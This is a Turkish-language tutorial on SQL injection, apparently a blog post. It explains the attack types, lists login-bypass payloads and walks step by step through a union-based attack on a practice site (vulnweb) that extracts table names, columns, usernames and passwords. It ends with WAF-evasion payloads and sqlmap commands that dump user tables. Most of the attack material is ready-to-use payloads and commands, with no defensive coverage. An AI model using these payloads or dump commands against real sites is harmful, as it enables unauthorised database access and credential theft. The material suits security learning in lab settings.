SQL Injection Nedir?

SQL Injection, web uygulamalarının kullanıcı girişi içeriklerini doğrulamadan veya filtrelemeden SQL sorgularına dahil etmesi sonucu meydana gelen bir güvenlik zafiyetidir. Bu zafiyet, bir siber saldırganın zararlı SQL kodlarını enjeksiyon yaparak veritabanına yetkisiz erişim sağlamasına olanak tanır.

SQL Injection Türleri
Classic SQL Injection
Klasik SQL Injection, kullanıcı girişi aracılığıyla doğrudan zararlı SQL kodlarının veritabanı sorgularına eklenmesi şeklinde gerçekleşir.

Örnek:

' OR '1'='1'; --
Bu kod, SQL sorgusunun daima doğru dönmesini sağlar ve potansiyel olarak tüm kayıtları döndürebilir.

Blind SQL Injection
Blind (Kör) SQL Injection, uygulamanın hata mesajları vermediği, ancak dolaylı yöntemlerle veri çekmenin mümkün olduğu durumları ifade eder.

Örnek:

' AND (SELECT COUNT(*) FROM users) > 0; --
Bu yöntemle, sorgunun sonucunu farklı yanıtlarla kontrol ederek veri sızıntısı yapılabilir.

Time-Based Blind SQL Injection
Bu tür saldırı, sorguların yürütülme süresindeki gecikmeleri kullanarak veri elde eder.

Örnek:

' OR IF(1=1, SLEEP(5), 0); --
Bu sorgu, ifadesi doğruysa sorgunun 5 saniye beklemesini sağlar.

Error-Based SQL Injection
Error-Based SQL Injection, veritabanından hata mesajlarını kullanarak bilgi toplar.

Örnek:

' OR 1=CONVERT(int, (SELECT @@version)); --
Bu sorgu, veritabanı versiyonunu hata mesajları üzerinden çekebilir.

Union-Based SQL Injection
Union-Based SQL Injection, UNION komutunu kullanarak birden fazla sorgunun sonucunu birleştirir ve veri çekmeye çalışr.

Örnek:

' UNION SELECT null, username, password FROM users; --
Bu sorgu, “users” tablosundaki “username” ve “password” sütunlarını döndürebilir

Login Kısımlarında SQL Injection
SQL Injection, genellikle kullanıcı giriş formlarında meydana gelir. Kötü niyetli bir kullanıcı, doğrulama kodunu atlamak veya hassas bilgilere erişim sağlamak için zararlı kodlar ekleyebilir.

Örnek Bir Login Formu Sorgusu:

SELECT * FROM users WHERE username = 'kullanici' AND password = 'sifre';
Zararlı Kod Örneği:

' OR '1'='1'; --
Bu zararlı kod “username” ve “password” alanlarına girildiğinde, sorgu şu hale gelir:

SELECT * FROM users WHERE username = '' OR '1'='1'; --' AND password = '';
Bu durumda, sorgunun “OR ‘1’=’1'” kısmı her zaman doğru olduğu için tüm kullanıcılar döndürülür ve kimlik doğrulama atlanmış olur.

bazı login sql injection kodları şunlardır ;

Örnek:

admin'#
1'  OR 1=1#
admin'--
admin'/*
' or 1=1/*
') or '1'='1--
1' OR 1=1#
1' OR 1=1--
1'or'1'='1
admin'# (admin yerine kullanıcı adı biliyorsan yaz)
admin'--
deneme' OR 1=1--
deneme' OR 1=1#
deneme'+OR+1=1--
deneme'+OR+1=1#
'=''or'--+
ÖRNEK SQL İNJECTİON UYGULAMASI
Bu uygulamayı vulnweb den yapıyoruz tamamen yasaldır.

Adım 1 tespit etme ;
sql injection’u tespit etmek için illa ‘ kullanma 1 no lu id de ne varsa aklında tut ve 2 ye git 2 ye gittikten sonra
id=2–1 de ve 1 no lu id daki şeyi görüyorsan sql var demek sql matematik işlemlerini yapabilen bir dildir sayfa 1 deki içerik ne ise sayfa 2 ye gittiğinizde farklı bir içerik gelicektir 2–1 dediğinizde 1.sayfadaki içerik geliyorsa zafiyet tespit edilmiştir




1~2 >>> 2–1 , 2¹ (3 eder 3.id ile aynı mı) yada tek tırnak yerine 2 tane koy sistem çalışıyorsa sql online
sonra kolon bulmalısın id den sonra UNION SELECT 1,2,3,4,5, hata gidene kadar dene gittikten sonra sayfanın en alt kısmına in ordaki sayıların olduğu yerden bilgi çek

Adım 2 UNION SELECT İLE KOLON BULMA ;
id den sonra UNION SELECT 1,2,3,4,5, hata gidene kadar dene gittikten sonra sayfanın en alt kısmına in ordaki sayıların olduğu yerden bilgi çek

(eğer ekranda çok yazı içerik var ise id değerine -999999 gir tek senin sorgun çalışcak)



11 kolon olduğunu bulduk ve sayfadaki hata gitti sıra kolonda bulunan tabloları görmekte

Adım 3 TABLOLARI GÖRMEK ;
?id=1 UNION SELECT 1,table_name,3,4,5,6,7,8,9,10,11 FROM information_schema.tables WHERE table_schema = database() 
(tablo şemasının mevcuttaki database eşit olanları getir dedik)
?id=1: Bu, hedef web uygulamasında kullanılan URL parametresidir. Normalde, id=1 bir sorguya dahil edilerek belirli bir kayıt çekilir.

UNION SELECT: UNION komutu, iki veya daha fazla SELECT ifadesinin sonuçlarını birleştirir. Bu, saldırganın kendi seçtiği bilgileri mevcut sorgunun sonucuyla birleştirerek döndürmesine olanak tanır.

1, table_name, 3, 4, 5, 6, 7, 8, 9, 10, 11: Bu kısımda, saldırgan veritabanı sorgusunun beklediği sütun sayısına uygun bir SELECT ifadesi oluşturur. table_name, veritabanındaki tablo adlarını çekmek için kullanılan sütundur. Diğer sayılar, sütun sayısını eşleştirmek için yer tutuculardır.

FROM information_schema.tables: Bu, SQL veritabanı sistemlerinde kullanılan bir meta veri tablosudur. information_schema.tables, veritabanındaki tüm tablolar hakkında bilgi içerir.

WHERE table_schema = database(): Bu koşul, yalnızca şu anki veritabanı (database() fonksiyonu mevcut veritabanı adını döndürür) içindeki tabloların adlarını döndürmek için kullanılır.



Adım 4 TABLODAN SÜTUN ADLARINI ÖĞRENMEK ;
?id=-99999 UNION SELECT 1,column_name,3,4,5,6,7,8,9,10,11 FROM information_schema.columns WHERE table_name = 'users'
Users tablosundaki kolonları bulmak için kodumuzu bu şekilde düzelttik.

?id=-99999: Bu, saldırganın sorgunun başarılı olması için manipüle ettiği bir parametre. -99999 değeri, var olmayan bir kayıt numarasını temsil eder ve sorgunun doğal sonucunun boş dönmesini sağlar, böylece UNION sorgusunun sonucu görüntülenir.

UNION SELECT: UNION komutu, iki veya daha fazla SELECT ifadesinin sonuçlarını birleştirir. Bu, saldırganın kendi seçtiği bilgileri mevcut sorgunun sonucuyla birleştirerek döndürmesine olanak tanır.

1, column_name, 3, 4, 5, 6, 7, 8, 9, 10, 11: Bu kısımda, saldırgan sütun sayısını mevcut sorguyla eşleştirecek şekilde bir SELECT ifadesi oluşturur. column_name, belirli bir tablodaki sütun adlarını çekmek için kullanılan sütundur. Diğer sayılar, sütun sayısını eşleştirmek için yer tutuculardır.

FROM information_schema.columns: information_schema.columns, veritabanında bulunan tüm tabloların sütunları hakkında bilgi içerir.

WHERE table_name = 'users': Bu koşul, yalnızca users tablosundaki sütunların adlarını döndürmek için kullanılır. Saldırgan, bu tabloya özel sütun bilgilerini çekmeye çalışır.

Gelen sütunlar bu şekilde username password cc bilgileri mevcut.


Adım 5 TABLODAN VERİ ÇEKME ;
?id=-99999 UNION SELECT 1,passwd,3,4,5,6,username,8,9,10,11 FROM users

Error Based SQLi ;
extractvalue(rand(), concat(1,(SELECT database()))); 
(database ismi öğrenme select siz de id dibine koyabilirsin)

SELECT extractvalue(rand(), concat(1,(UNION SELECT 1,2,3,4,5,6,7,7,8,9,10,11-- -)))
error based da bu şekilde yola çıkabilirsiniz.

boolen based sqli;
eğer veri ekrana yansımıyorsa;

?id=1 and (SELECT 1)=1 (içerik gözüküyor olması gerek sonrasında ?id=1 and (SELECT 1)=2 de içerik gidiyorsa)
?id=1 and SUBSTRING ((SELECT table_name FROM information_schema.tables WHERE table_schmea=database()LIMIT 1.1),1,1)=’a’ (harfleri dene içerik gelince tablonun ilk adını buldun sonra en dıştaki 1,1 den baştaki 1i 2 yap ve tekrar alfabe dene)

HIZLANDIRMAK İÇİM ASCİİ EKLİYORUZ ;
and ASCII(SUBSTRING ((SELECT table_name FROM information_schema.tables WHERE table_schmea=database()LIMIT 1.1),1,1))>80 
(80den büyükse özel karakter falan yok google dan bak )
eğer hiçbişey dönmüyorsa ascii yada karakteri bulsanda bulmasanda 
time based sqli;

?id= IF(1=1,1,0)  (içerik dönmesi gerek) sonra IF(1=1,sleep(5),0)
5 snye uyku ve sql inj buldun
süre tam tutmuyorsa id= 1 and 1=IF(1=1,sleep(5),0) 
SQL İNJECTİON BYPASS ;
filtrelenmiş e mail şifre kontrolünden geçip sql inj bulmamıza yardım eder “‘tes’t@testgmail.com” yada “‘test@test.com” bunu kabul ediyor mu dene kabul ediyorsa bunu dene “‘@test.com”>test — @test.com” sonra eğer boşluklar sorun çıkarıyorsa “‘/**/@test.com”>test — @test.com” yani ‘/**/UNION/**/SELECT/**/table_name/**/from/**/information_schema.tables — /**/@test.com

cheatsheat arat
waf bypass sql injection arat
filtrelenmiş olabilir dene
‘ işaretinde filtre olabilir onu sil öyle dene
boşluklar filtrelenmiş ise (+)
dene kelime filtrelenmiş ise büyük küçük karışık yaz(uNıOn)
# E filtre var ise ( — )yada(//)dene
url encode dene

Time delay ekle
burp suite ile dene isteği yakala sonra değiştir
eğer belirli şeyler filtrelenmişse hex kodunu burp üzerinden al dene
char encode dene

+unIoN+sElEcT+1,2%23
+unIoN+sElEcT+1,database()+FrOm+information_schema.tables%23
+unIoN+sElEcT+1,table_name+FrOm+information_schema.tables%23
+unIoN+sElEcT+user,password+FrOm+users%23
SQLMAP İLE ;

sqlmap -u "url" --random-agent --risk=3 --level=3 --dbs --threads 10 (databse ismi bulur)
sqlmap -u "url" --random-agent -D databaseismi -tables --risk=3 --level=3 (tablo bulur)
sqlmap -u "url" --random-agent -D databaseismi -T users -columns --risk=3 --level=3(colum bulur)
sqlmap -u "url" --random-agent -D databaseismi -T users --dump --risk=3 --level=3 ( kırar şifre)
sqlmap -u "url" --random-agent -D databaseismi -T users -C user,pass --dump --risk=3 --level3